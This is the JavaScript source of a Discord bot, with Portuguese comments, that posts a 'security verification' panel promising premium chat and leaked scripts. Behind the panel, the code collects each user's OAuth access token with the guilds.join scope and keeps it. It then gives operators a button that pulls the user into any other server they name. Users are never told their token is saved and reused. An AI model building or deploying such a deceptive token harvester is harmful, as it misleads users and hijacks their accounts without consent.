require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { 
    Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, 
    ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, 
    TextInputStyle, PermissionsBitField 
} = require('discord.js');

// --- CONFIGURAÇÕES ---
const LOG_CHANNEL_ID = process.env.LOG_CHANNEL_ID; 
const REDIRECT_TARGET = 'https://discord.com/app'; 

const app = express();
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers 
    ]
});

const userTokens = new Map();

// --- SERVIDOR WEB ---
app.get('/', (req, res) => res.send('Global Auth Bot Online 🌍'));

app.get('/callback', async (req, res) => {
    const { code, state } = req.query; 

    if (!code) return res.send('Erro: Código não encontrado.');

    try {
        const tokenResponse = await axios.post(
            'https://discord.com/api/oauth2/token',
            new URLSearchParams({
                client_id: process.env.CLIENT_ID,
                client_secret: process.env.CLIENT_SECRET,
                code,
                grant_type: 'authorization_code',
                redirect_uri: process.env.REDIRECT_URI,
                scope: 'identify guilds.join',
            }),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );

        const { access_token } = tokenResponse.data;
        const userResponse = await axios.get('https://discord.com/api/users/@me', {
            headers: { Authorization: `Bearer ${access_token}` },
        });

        const user = userResponse.data;
        userTokens.set(user.id, access_token);

        let statusCargo = "⏭️ Ignorado (State vazio)";
        let nomeServidor = "Desconhecido";

        if (state) {
            try {
                const guild = client.guilds.cache.get(state);
                if (guild) {
                    nomeServidor = guild.name;
                    const member = await guild.members.fetch(user.id).catch(() => null);
                    const role = guild.roles.cache.find(r => r.name === 'Auth2 Vetificados');

                    if (member && role) {
                        await member.roles.add(role);
                        statusCargo = `✅ Entregue em: ${guild.name}`;
                    } else {
                        statusCargo = `❌ Falha: Cargo não existe em ${guild.name}`;
                    }
                }
            } catch (e) {
                console.error(e);
                statusCargo = "❌ Erro ao processar cargo";
            }
        }

        const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
        if (logChannel) {
            const embedLog = new EmbedBuilder()
                .setTitle('🌍 Nova Verificação Global')
                .setThumbnail(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`)
                .addFields(
                    { name: 'Usuário', value: `${user.username}\n(${user.id})`, inline: true },
                    { name: 'Origem', value: nomeServidor, inline: true },
                    { name: 'Cargo', value: statusCargo, inline: false }
                )
                .setColor(0x00FF00)
                .setFooter({ text: 'Token salvo com sucesso' });

            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId(`btn_abrir_envio_${user.id}`)
                    .setLabel('Enviar para outro Servidor')
                    .setStyle(ButtonStyle.Primary)
                    .setEmoji('✈️')
            );

            await logChannel.send({ embeds: [embedLog], components: [row] });
        }

        res.send(`
            <!DOCTYPE html>
            <html lang="pt-br">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Verificado</title>
                <style>
                    body { background-color: #2b2d31; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
                    .card { background-color: #313338; padding: 40px; border-radius: 10px; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
                    h1 { color: #23a559; }
                    .btn { background-color: #5865F2; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; margin-top: 20px; display: inline-block; }
                </style>
            </head>
            <body>
                <div class="card">
                    <h1>✅ Sucesso!</h1>
                    <p>Você foi verificado no servidor <b>${nomeServidor}</b>.</p>
                    <p>${statusCargo.includes('✅') ? 'Cargo recebido.' : 'Aguarde aprovação.'}</p>
                    <a href="${REDIRECT_TARGET}" class="btn">Voltar para o Discord</a>
                </div>
            </body>
            </html>
        `);

    } catch (error) {
        console.error(error);
        res.send('Erro na verificação.');
    }
});

app.listen(process.env.PORT || 3000);

// --- BOT DISCORD ---
client.once('ready', async () => {
    console.log(`🤖 Bot Logado Globalmente: ${client.user.tag}`);
    
    const commands = [
        { 
            name: 'setup_auth', 
            description: 'Cria o painel de verificação neste canal' 
        }
    ];

    await client.application.commands.set(commands);
    console.log("✅ Comandos Globais registrados/atualizados!");
});

client.on('interactionCreate', async interaction => {
    
    // 1. COMANDO SETUP (TEXTO NOVO APLICADO AQUI)
    if (interaction.isChatInputCommand() && interaction.commandName === 'setup_auth') {
        if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) 
            return interaction.reply({ content: '❌ Apenas Admins.', ephemeral: true });

        const authUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify+guilds.join&state=${interaction.guild.id}`;

        const embed = new EmbedBuilder()
            .setTitle('🛡️ Verificação de Segurança')
            .setDescription('Se verifique para poder ter acesso a itens exclusivos no servidor, como: Chat premium, Scripts Vazados (E em beta), e muitas outras coisas!')
            .setColor(0x5865F2)
            .setFooter({ text: 'Sistema seguro de Verificação' });

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setLabel('Verificar Agora').setStyle(ButtonStyle.Link).setURL(authUrl).setEmoji('✅')
        );

        await interaction.channel.send({ embeds: [embed], components: [row] });
        await interaction.reply({ content: '✅ Painel criado neste canal!', ephemeral: true });
    }

    // 2. MODAL DE ENVIO
    if (interaction.isButton() && interaction.customId.startsWith('btn_abrir_envio_')) {
        const uid = interaction.customId.split('_')[3];
        const modal = new ModalBuilder().setCustomId(`modal_envio_${uid}`).setTitle('Mover Usuário');
        const input = new TextInputBuilder().setCustomId('srv_id').setLabel("ID do Servidor Destino").setStyle(TextInputStyle.Short);
        modal.addComponents(new ActionRowBuilder().addComponents(input));
        interaction.showModal(modal);
    }

    // 3. ENVIAR USUÁRIO
    if (interaction.isModalSubmit() && interaction.customId.startsWith('modal_envio_')) {
        const uid = interaction.customId.split('_')[2];
        const srvId = interaction.fields.getTextInputValue('srv_id');
        const token = userTokens.get(uid);

        await interaction.deferReply({ ephemeral: true });

        if (!token) return interaction.editReply('❌ Token expirou.');

        try {
            await axios.put(
                `https://discord.com/api/guilds/${srvId}/members/${uid}`,
                { access_token: token },
                { headers: { Authorization: `Bot ${process.env.BOT_TOKEN}` } }
            );
            interaction.editReply(`✅ Enviado para o servidor ID \`${srvId}\`.`);
        } catch (e) {
            interaction.editReply('❌ Falha. Verifique se o bot está no servidor destino.');
        }
    }
});

client.login(process.env.BOT_TOKEN);
